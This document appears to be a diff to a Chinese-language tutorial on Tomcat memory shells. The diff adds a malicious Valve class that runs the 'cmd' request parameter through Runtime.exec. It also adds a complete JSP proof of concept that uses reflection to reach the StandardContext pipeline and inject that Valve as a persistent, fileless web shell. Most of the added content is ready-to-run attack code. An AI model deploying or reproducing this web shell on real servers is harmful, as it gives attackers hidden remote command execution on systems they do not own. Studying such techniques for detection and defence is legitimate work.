@@ -128,7 +128,7 @@ public final void invoke(Request request, Response response)
     }
 ```
 `host.getPipeline().getFirst().invoke(request, response)`实现调用后续的Valve。
-# 动态台添加Valve
+# 动态添加Valve
 所以我们的思路如下
 1. 获取`StandardContext`对象
 2. 通过`StandardContext`对象获取`StandardPipeline`
@@ -147,10 +147,78 @@ public final void invoke(Request request, Response response)
     Pipeline pipeline = standardContext.getPipeline();
 %>
 ```
-编写恶意
-
-
-
+编写恶意Valve类
+```jsp
+<%!
+    class Shell_Valve extends ValveBase {
+ 
+        @Override
+        public void invoke(Request request, Response response) throws IOException, ServletException {
+            String cmd = request.getParameter("cmd");
+            if (cmd !=null){
+                try{
+                    Runtime.getRuntime().exec(cmd);
+                }catch (IOException e){
+                    e.printStackTrace();
+                }catch (NullPointerException n){
+                    n.printStackTrace();
+                }
+            }
+        }
+    }
+%>
+```
+## 将恶意Valve添加进StandardPipeline
+```
+<%
+    Shell_Valve shell_valve = new Shell_Valve();
+    pipeline.addValve(shell_valve);
+%>
+```
+# POC
+```jsp
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.Pipeline" %>
+<%@ page import="org.apache.catalina.valves.ValveBase" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.io.IOException" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+ 
+<%
+    Field reqF = request.getClass().getDeclaredField("request");
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+ 
+    Pipeline pipeline = standardContext.getPipeline();
+%>
+ 
+<%!
+    class Shell_Valve extends ValveBase {
+ 
+        @Override
+        public void invoke(Request request, Response response) throws IOException, ServletException {
+            String cmd = request.getParameter("cmd");
+            if (cmd !=null){
+                try{
+                    Runtime.getRuntime().exec(cmd);
+                }catch (IOException e){
+                    e.printStackTrace();
+                }catch (NullPointerException n){
+                    n.printStackTrace();
+                }
+            }
+        }
+    }
+%>
+ 
+<%
+    Shell_Valve shell_valve = new Shell_Valve();
+    pipeline.addValve(shell_valve);
+%>
+```
 
 
 
